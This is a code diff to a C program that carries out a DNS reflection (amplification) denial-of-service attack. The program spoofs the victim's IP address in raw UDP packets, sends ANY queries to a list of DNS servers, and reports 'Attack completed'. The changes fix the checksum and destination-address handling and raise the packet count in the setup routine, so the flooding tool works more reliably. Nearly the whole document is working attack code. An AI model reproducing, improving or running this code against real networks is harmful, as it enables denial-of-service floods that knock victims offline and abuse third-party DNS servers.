@@ -7,6 +7,7 @@
 #include <netinet/ip.h>	//Provides declarations for ip header
 #include <arpa/inet.h>
 #include <time.h>
+#include <unistd.h> 
 #include "utilities.h"
 
 void dns_reflection(char * victimIP, int victimPort, int query_type, int nPackets){
@@ -76,7 +77,7 @@ void dns_reflection(char * victimIP, int victimPort, int query_type, int nPacket
 	
 	sin.sin_family = AF_INET;
 	sin.sin_port = htons(DNS_PORT);
-	sin.sin_addr.s_addr = inet_addr ("192.168.1.1");
+	
 	
 	//Fill in the IP Header
 	iph->ihl = 5;
@@ -94,9 +95,8 @@ void dns_reflection(char * victimIP, int victimPort, int query_type, int nPacket
 
 	//UDP header
 	udph ->source = htons (victimPort);
-	udph->dest = htons (DNS_PORT);
-	
-	udph->check = 0;	//leave checksum 0 now, filled later by pseudo header
+	udph->dest = htons (DNS_PORT);	
+	udph->check = 0;	//filled later by pseudo header
 	
 	//Now the UDP checksum using the pseudo header
 	psh.source_address = inet_addr( source_ip );
@@ -107,6 +107,8 @@ void dns_reflection(char * victimIP, int victimPort, int query_type, int nPacket
 	time_t t;
 	srand((unsigned) time(&t));
 
+	int nPacketsSent = 0;
+
 	while (nPackets--){
 		//select hostname and dns server
 		int curDns = rand() % nDns;
@@ -115,17 +117,23 @@ void dns_reflection(char * victimIP, int victimPort, int query_type, int nPacket
 		//create dns payload
 		int payloadLength = dns_payload_gen(data, hostNames[curHost], query_type);
 
-		//update udp header
-		udph->len = htons(8 + payloadLength);	//udp size
-		psh.dest_address = iph->daddr;
-
 		//update ip header
 		iph->daddr = inet_addr(dnsServers[curDns]);
 		iph->tot_len = sizeof (struct iphdr) + sizeof (struct udphdr) + payloadLength;
+
+		//reset checksums
+		iph -> check = 0;
+		udph->check = 0;
+
 		//Ip checksum
 		iph->check = csum ((unsigned short *) datagram, iph->tot_len);
 
+		//update udp header
+		udph->len = htons(8 + payloadLength);	//udp size
+		
+
 		//update udp checksum
+		psh.dest_address = inet_addr(dnsServers[curDns]);
 		psh.udp_length = htons(sizeof(struct udphdr) + payloadLength);
 		int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + payloadLength;
 		pseudogram = malloc(psize);	
@@ -142,15 +150,14 @@ void dns_reflection(char * victimIP, int victimPort, int query_type, int nPacket
 		//Data send successfully
 		else
 		{
-			printf ("Packet Send. Length : %d \n" , iph->tot_len);
+			nPacketsSent++;
 		}
 	}
+	printf("Attack completed. %d packets sent.\n", nPacketsSent);
 
-
-	
 }
 
 void dns_reflection_setup(){
 	printf("⋊Ɔ∀⊥⊥∀ NOI⊥ƆƎ˥ℲƎᴚ SNᗡ\n");
-    dns_reflection("192.168.2.3", 6666, ANY, 1);
+    dns_reflection("192.168.2.3", 6666, ANY, 10);
 }
